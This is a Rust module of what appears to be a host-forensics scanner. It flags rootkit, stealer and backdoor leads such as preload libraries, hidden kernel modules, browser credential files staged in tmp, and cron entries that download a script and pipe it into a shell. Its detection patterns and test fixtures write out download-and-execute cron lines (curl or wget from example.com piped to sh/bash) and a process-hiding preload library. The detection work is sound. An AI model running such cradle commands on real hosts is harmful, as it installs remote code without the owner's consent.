// SPDX-License-Identifier: LicenseRef-QSL-1.0-0BSD
// Copyright (c) 2026 Quad4

//! Host leads for rootkits, stealers, and backdoors.
//! A hit is a lead. It is not an identification and it does not remove anything.

use crate::osint::{Hit, Report, Status};
use std::path::Path;
use std::time::Instant;

pub fn scan(root: &Path) -> Report {
    let t0 = Instant::now();
    let mut findings = Vec::new();
    preload(root, &mut findings);
    cron(root, &mut findings);
    staging(root, &mut findings);
    deleted(root, &mut findings);
    modules(root, &mut findings);
    bpf(root, &mut findings);
    writable_account(root, &mut findings);
    if findings.is_empty() {
        findings.push(Hit::new(
            "threats",
            Status::Absent,
            "no preload, cron cradle, staging file, or hidden-module lead in this tree",
            None,
        ));
    }
    Report {
        target: root.display().to_string(),
        kind: "threats",
        elapsed_ms: t0.elapsed().as_millis() as u64,
        findings,
    }
}

pub fn cron_cradle(line: &str) -> bool {
    let low = line.to_ascii_lowercase();
    let body = low.trim_start();
    if body.is_empty() || body.starts_with('#') {
        return false;
    }
    let pipe = body.contains("| sh")
        || body.contains("|sh")
        || body.contains("| bash")
        || body.contains("|bash");
    let fetch = body.contains("curl ")
        || body.contains("wget ")
        || body.contains("base64 -d")
        || body.contains("base64 --decode");
    pipe && fetch
}

pub fn deleted_exe(target: &str) -> bool {
    target.contains("(deleted)")
}

fn preload(root: &Path, out: &mut Vec<Hit>) {
    let path = root.join("etc/ld.so.preload");
    let Ok(text) = std::fs::read_to_string(&path) else {
        return;
    };
    let libs: Vec<_> = text
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect();
    if libs.is_empty() {
        return;
    }
    out.push(Hit::new(
        "preload",
        Status::Confirmed,
        format!("ld.so.preload lists {}", libs.join(", ")),
        None,
    ));
}

fn cron(root: &Path, out: &mut Vec<Hit>) {
    let mut files = vec![root.join("etc/crontab"), root.join("etc/rc.local")];
    for dir in ["etc/cron.d", "var/spool/cron", "var/spool/cron/crontabs"] {
        let dir = root.join(dir);
        if let Ok(rd) = std::fs::read_dir(&dir) {
            for ent in rd.flatten() {
                files.push(ent.path());
            }
        }
    }
    for path in files {
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        for (n, line) in text.lines().enumerate() {
            if cron_cradle(line) {
                out.push(Hit::new(
                    "cron-cradle",
                    Status::Confirmed,
                    format!("{}:{} fetches a script into a shell", path.display(), n + 1),
                    None,
                ));
            }
        }
    }
}

fn staging(root: &Path, out: &mut Vec<Hit>) {
    const NAMES: &[&str] = &["Login Data", "cookies.sqlite", "key4.db", "logins.json"];
    for dir in ["tmp", "dev/shm", "var/tmp"] {
        walk_names(root, &root.join(dir), NAMES, 0, out);
    }
}

fn walk_names(root: &Path, dir: &Path, names: &[&str], depth: u8, out: &mut Vec<Hit>) {
    if depth > 3 {
        return;
    }
    let Ok(rd) = std::fs::read_dir(dir) else {
        return;
    };
    for ent in rd.flatten() {
        let name = ent.file_name();
        let Some(name) = name.to_str() else {
            continue;
        };
        if names.contains(&name) {
            let rel = ent
                .path()
                .strip_prefix(root)
                .unwrap_or(ent.path().as_path())
                .display()
                .to_string();
            out.push(Hit::new(
                "staging",
                Status::Confirmed,
                format!("{rel} looks like a browser credential file outside a profile"),
                None,
            ));
        }
        if ent.file_type().is_ok_and(|t| t.is_dir()) {
            walk_names(root, &ent.path(), names, depth + 1, out);
        }
    }
}

fn deleted(root: &Path, out: &mut Vec<Hit>) {
    let proc = root.join("proc");
    let Ok(rd) = std::fs::read_dir(&proc) else {
        return;
    };
    for ent in rd.flatten() {
        let Some(pid) = ent.file_name().to_str().and_then(|s| s.parse::<u32>().ok()) else {
            continue;
        };
        let Ok(target) = std::fs::read_link(ent.path().join("exe")) else {
            continue;
        };
        let text = target.to_string_lossy();
        if deleted_exe(&text) {
            out.push(Hit::new(
                "deleted-exe",
                Status::Confirmed,
                format!("pid {pid} is running a deleted binary"),
                None,
            ));
        }
    }
}

fn modules(root: &Path, out: &mut Vec<Hit>) {
    let listed = std::fs::read_to_string(root.join("proc/modules")).unwrap_or_default();
    let mut from_proc = std::collections::HashSet::new();
    for line in listed.lines() {
        if let Some(name) = line.split_whitespace().next() {
            from_proc.insert(name.to_string());
        }
    }
    let sys = root.join("sys/module");
    let Ok(rd) = std::fs::read_dir(&sys) else {
        return;
    };
    let mut only_sys = Vec::new();
    for ent in rd.flatten() {
        let Some(name) = ent.file_name().to_str().map(str::to_string) else {
            continue;
        };
        if !from_proc.contains(&name) {
            only_sys.push(name);
        }
    }
    if !from_proc.is_empty() && !only_sys.is_empty() {
        only_sys.sort();
        only_sys.truncate(8);
        out.push(Hit::new(
            "modules",
            Status::Inconclusive,
            format!(
                "sysfs lists modules missing from /proc/modules: {}",
                only_sys.join(", ")
            ),
            None,
        ));
    }
}

fn bpf(root: &Path, out: &mut Vec<Hit>) {
    let dir = root.join("sys/fs/bpf");
    let Ok(rd) = std::fs::read_dir(&dir) else {
        return;
    };
    let n = rd.flatten().count();
    if n > 0 {
        out.push(Hit::new(
            "bpf",
            Status::Inconclusive,
            format!("{n} pinned bpf object(s) under sys/fs/bpf"),
            None,
        ));
    }
}

fn writable_account(root: &Path, out: &mut Vec<Hit>) {
    for rel in ["etc/passwd", "etc/shadow"] {
        let path = root.join(rel);
        let Ok(meta) = std::fs::metadata(&path) else {
            continue;
        };
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            if meta.permissions().mode() & 0o002 != 0 {
                out.push(Hit::new(
                    "accounts",
                    Status::Confirmed,
                    format!("{rel} is writable by others"),
                    None,
                ));
            }
        }
        let _ = meta;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cron_cradle_is_a_lead() {
        assert!(cron_cradle("* * * * * curl https://example.com/a | sh"));
        assert!(!cron_cradle("# curl https://example.com/a | sh"));
        assert!(!cron_cradle("0 3 * * * /usr/bin/backup"));
        let dir = std::env::temp_dir().join(format!("argus-threats-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("etc")).unwrap();
        std::fs::write(dir.join("etc/ld.so.preload"), "/lib/libprocesshider.so\n").unwrap();
        std::fs::write(
            dir.join("etc/crontab"),
            "* * * * * wget -q -O - https://example.com/x | bash\n",
        )
        .unwrap();
        std::fs::create_dir_all(dir.join("tmp")).unwrap();
        std::fs::write(dir.join("tmp/Login Data"), "x").unwrap();
        let report = scan(&dir);
        let mods: Vec<_> = report.findings.iter().map(|h| h.module.as_str()).collect();
        assert!(mods.contains(&"preload"));
        assert!(mods.contains(&"cron-cradle"));
        assert!(mods.contains(&"staging"));
        let _ = std::fs::remove_dir_all(&dir);
    }
}
